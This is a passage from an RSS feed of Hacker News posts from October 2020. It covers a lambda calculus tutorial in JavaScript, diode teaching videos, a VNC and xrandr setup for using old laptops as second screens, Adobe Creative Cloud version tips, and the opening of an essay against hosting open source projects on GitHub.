<figcaption><a href="https://unsplash.com/photos/3AsAVTBIw5I" target="_blank">Photo by Max Hermansson</a></figcaption>  
</figure>


        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://jasonformat.com/islands-architecture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24877125</guid>
            <pubDate>Sat, 24 Oct 2020 05:15:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An introduction to Lambda Calculus, explained through JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24876171">thread link</a>) | @fagnerbrack
<br/>
October 23, 2020 | http://willtaylor.blog/an-introduction-to-lambda-calculus-explained-through-javascript/ | <a href="https://web.archive.org/web/*/http://willtaylor.blog/an-introduction-to-lambda-calculus-explained-through-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>
  </li>
  <li>
    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>
  </li>
  <li>
    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>
  </li>
</ol>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://willtaylor.blog/an-introduction-to-lambda-calculus-explained-through-javascript/">http://willtaylor.blog/an-introduction-to-lambda-calculus-explained-through-javascript/</a></em></p>]]>
            </description>
            <link>http://willtaylor.blog/an-introduction-to-lambda-calculus-explained-through-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24876171</guid>
            <pubDate>Sat, 24 Oct 2020 01:32:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Diodes Work [video]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24875847">thread link</a>) | @furcyd
<br/>
October 23, 2020 | https://shiftingphases.com/2020/10/23/how-diodes-work/ | <a href="https://web.archive.org/web/*/https://shiftingphases.com/2020/10/23/how-diodes-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

			<!-- #masthead -->

			<div id="content">

	<section id="primary">
		<main id="main" role="main">

		
			<article id="post-3603">
	
	
		

	<div>
		
<figure><a href="https://www.screencast.com/t/n507y4H7qYEv" target="_blank"><img data-attachment-id="3610" data-permalink="https://shiftingphases.com/2020/10/23/how-diodes-work/introduction-to-diodes-title-slide/" data-orig-file="https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png" data-orig-size="912,646" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Introduction to Diodes Title slide" data-image-description="" data-medium-file="https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=300" data-large-file="https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=723" src="https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=723" alt="" srcset="https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=723 723w, https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=150 150w, https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=300 300w, https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png?w=768 768w, https://shiftingphases.files.wordpress.com/2020/10/introduction-to-diodes-title-slide.png 912w" sizes="(max-width: 723px) 100vw, 723px"></a></figure>



<div><p>A few people have asked recently what exactly is going on inside the PN junction. What concretely is happening? How can we leverage students’ previous knowledge about current and charge?</p><p>I made these videos because I wasn’t satisfied with the textbook or the available resources. No math; just a heuristic blow-by-blow focusing on electrons, physical force, and causality. The production value ranges from amateur to terrible. But the content is what underlies everything from transistors to solar panels to logic gates.</p></div>



<p>A series of <a href="https://www.screencast.com/t/n507y4H7qYEv" target="_blank" rel="noreferrer noopener">11 short videos</a> uses this <a href="https://shiftingphases.files.wordpress.com/2020/10/intro-to-diodes-instructor.ppt">slide deck</a> (also available in <a href="https://shiftingphases.files.wordpress.com/2020/10/intro-to-diodes-instructor.pdf" target="_blank" rel="noreferrer noopener">*.PDF</a>).<br></p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article><!-- #post-## -->

			
<!-- #comments -->

		
		</main><!-- #main -->
	</section><!-- #primary -->

	<!-- #secondary -->

	</div><!-- #content -->

	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://shiftingphases.com/2020/10/23/how-diodes-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875847</guid>
            <pubDate>Sat, 24 Oct 2020 00:28:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old Laptops as Secondary Monitors]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 17 (<a href="https://news.ycombinator.com/item?id=24875533">thread link</a>) | @HaoZeke
<br/>
October 23, 2020 | https://rgoswami.me/posts/laptop-as-second-screens/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/laptop-as-second-screens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>
            </description>
            <link>https://rgoswami.me/posts/laptop-as-second-screens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875533</guid>
            <pubDate>Fri, 23 Oct 2020 23:33:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Updating to the Latest Adobe Creative Cloud While Maintaining Earlier Versions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24875192">thread link</a>) | @maxdunn1
<br/>
October 23, 2020 | https://www.siliconpublishing.com/blog/updating-to-the-latest-adobe-creative-cloud/ | <a href="https://web.archive.org/web/*/https://www.siliconpublishing.com/blog/updating-to-the-latest-adobe-creative-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
		<a href="#content">Skip to content</a>

	<div id="boxed-wrapper">
		
		<div id="wrapper">
			
							<section><div data-transition-offset="15" data-scroll-offset="0" data-sticky-height-transition="1" data-sticky-small-visibility="1" data-sticky-medium-visibility="1" data-sticky-large-visibility="1"><div><div><div><div><span><a href="https://www.siliconpublishing.com/" target="_self"><img src="https://www.siliconpublishing.com/wp-content/uploads/2020/09/SP-Logo-Outlines-2020.png" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2020/09/SP-Logo-Outlines-2020.png" srcset="https://www.siliconpublishing.com/wp-content/uploads/2020/09/SP-Logo-Outlines-2020.png 1x, https://www.siliconpublishing.com/blog/updating-to-the-latest-adobe-creative-cloud/2x" data-srcset="https://www.siliconpublishing.com/wp-content/uploads/2020/09/SP-Logo-Outlines-2020.png 1x, 2x" width="419" height="92" alt="Silicon Publishing Logo"></a></span></div></div></div></div></div>
</section>
		
							
			
						<main id="main">
				<div>
<section id="content">
									<div id="post-1046">

				<div>
					<div data-animationtype="fadeInUp" data-animationduration="0.6" data-animationoffset="100%"><div><div><div><div><span><img width="830" height="480" alt="Update Adobe CC while preserving previous versions" title="Update Adobe CC without removing old versions" src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27830%27%20height%3D%27480%27%20viewBox%3D%270%200%20830%20480%27%3E%3Crect%20width%3D%27830%27%20height%3D%273480%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOldBig.gif"></span></div><div><span>By <span><a href="https://www.siliconpublishing.com/blog/author/max/" title="Posts by Max Dunn" rel="author">Max Dunn</a></span></span><span></span><span>Published On: October 24, 2020</span><span></span></div><div><h3><span>How do I keep previous versions of an Adobe CC application as I install the new one?</span></h3>
<p><span>What is the trick? On install,<strong> uncheck “Remove old versions”</strong>. That’s it! And you’ll keep your older versions of InDesign (or Photoshop, or whatever).</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOld.gif" alt="Install updates without removing old versions of Adobe CC apps" width="480" height="270"></span></p>
<p><span>You can also enable auto-update and tell it to keep your old versions.</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_PreferencesRemoveOld.gif" alt="Change Preferences for Adobe CC apps to auto-update but not remove old versions" width="480" height="270"></span></p>
<h3><span>How do I get back a previous version of an Adobe CC application that was unintentionally removed?</span></h3>
<p><span>This option is a little less hidden than it has been in the past. It really is quite simple:</span></p>
<p><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_OtherVersions.gif" alt="Install previous Adobe app versions with the Other Versions option" width="480" height="270"></p>


<p><span>With the recent release of Adobe CC 2021, we’ve fielded the same questions that we received with previous Creative Cloud updates. Three main questions arise:</span></p>
<ol>
<li>Why would I want to keep a previous version of Adobe CC apps (such as InDesign) around?</li>
<li>How do I keep previous versions of an Adobe CC application as I install the new one?</li>
<li>How do I install a previous version of an Adobe CC application when I find it was unintentionally removed?</li>
</ol>
<h3>Why might I want to keep previous versions of Adobe CC applications (such as InDesign) around?</h3>
<p>Out with the old, in with the new, right? In this age of phones and app stores, software moves at a much faster pace than traditional PC applications, especially those in the world of print and serious graphics. The average App Store application has a lifespan of one month, and “auto-update” is all the rage among web browsers, phone apps, even PC applications. Plus, with the modern subscription paradigm, as embraced by Adobe these days, upgrading is FREE! It is also free to keep older versions.</p>
<p>Sure, you can take the plunge, easily, but there may be reasons to pause and consider, “should I kill the old version while moving to the new?” I think the reality is that users should install the new CC 20XX version when available. Yet, in most cases, <strong>it is a best practice to keep the older version as well.</strong></p>
<h4>Why might I want to keep the previous version of CC around?</h4>
<p>There are at least two reasons you may wish to keep CC 2019 on your computer while you install CC 2020:</p>
<ol>
<li>You have validated production workflows in CC 2019 and <strong>haven’t yet tested</strong> these in CC 2020.</li>
<li>Your workflow includes <strong>third-party plugins that don’t yet work with CC 2020. </strong>In most cases, it takes anywhere from a few days to a few months for third-party developers to update their plugins to the new CC version.</li>
</ol>
<h4>You don’t need to choose between CC 2020 and CC 2021!</h4>
<p>As far as Adobe software goes, the upgrade decision doesn’t need to be either/or between the new and previous version. This seems to be a very common mis-conception. <strong>Versions of InDesign and other CC apps co-exist quite nicely.&nbsp;</strong>This has been the case from time immemorial. It has always been an option to <strong>add</strong> the new version <strong>without removing</strong> the older version.</p>
<p>You might think this is a Boolean decision – just one version or the other – because CC apps by default will remove old versions on install. But no, <strong>it is easy to choose to keep the previous version</strong> (though this would be the default, in an ideal world) if you know how to do it.</p>
<p><span>Please&nbsp;<a href="mailto:maxdunn@siliconpublishing.com" rel=" noopener">email us</a> if you can’t figure out how to put back a previous version, or if you have questions about maintaining multiple versions of Creative Cloud applications.</span></p>






</div><section><!-- fusion-carousel --></section><!-- related-posts --></div></div></div></div>
				</div>
			</div>
			</section>
						
					</div>  <!-- fusion-row -->
				</main>  <!-- #main -->
				
				
								
					<section><div><div data-bg="https://www.siliconpublishing.com/wp-content/uploads/2020/09/footer-pattern.png"><div><div><div><div><p>The world leader in automating web-to-print and multichannel publishing with Adobe InDesign, we deliver best-in-class solutions for some of the world’s top brands including Nike, Google, Amazon, Hallmark, Adobe, and Disney.</p>
</div></div></div><div><div><ul><li><span><i aria-hidden="true"></i></span><div>
<p>100 Pine St. Suite 1250<br>
San Francisco, CA 94111</p>
</div></li><li><span><i aria-hidden="true"></i></span></li><li><span><i aria-hidden="true"></i></span><div>
<p>sales@SiliconPublishing.com</p>
</div></li></ul></div></div><div><div><div><p>Stay up-to-date on our products and evolving technologies in our fast-moving industry.</p>
</div></div></div></div></div><div><div><div><div><div><span><img width="446" height="97" alt="Silicon Publishing logo" title="silicon publishing white" src="https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white.png" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white.png" srcset="https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white-200x43.png 200w, https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white-400x87.png 400w, https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white.png 446w" data-srcset="https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white-200x43.png 200w, https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white-400x87.png 400w, https://www.siliconpublishing.com/wp-content/uploads/2020/09/silicon-publishing-white.png 446w" data-sizes="auto" data-orig-sizes="(max-width: 640px) 100vw, 400px"></span></div></div></div><div><div><div><p>© Copyright 2000 –  Silicon Publishing, Inc. | All Rights Reserved</p>
</div></div></div></div></div><div><div><div><div><div tabindex="-1" role="dialog" aria-labelledby="modal-heading-1" aria-hidden="true"><div><div><div><h3 id="modal-heading-1" data-dismiss="modal" aria-hidden="true">Request a Consultation or Demo</h3></div></div></div></div></div></div></div></div>
</div></section>
					

												</div> <!-- wrapper -->
		</div> <!-- #boxed-wrapper -->
		
		
		
		<a></a>

		

			
		

</div>]]>
            </description>
            <link>https://www.siliconpublishing.com/blog/updating-to-the-latest-adobe-creative-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875192</guid>
            <pubDate>Fri, 23 Oct 2020 22:51:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unix Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24875071">thread link</a>) | @mschrage
<br/>
October 23, 2020 | https://ruzkuku.com/txt/unix-harmful.html | <a href="https://web.archive.org/web/*/https://ruzkuku.com/txt/unix-harmful.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ruzkuku.com/txt/unix-harmful.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875071</guid>
            <pubDate>Fri, 23 Oct 2020 22:38:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24874987">thread link</a>) | @mrzool
<br/>
October 23, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
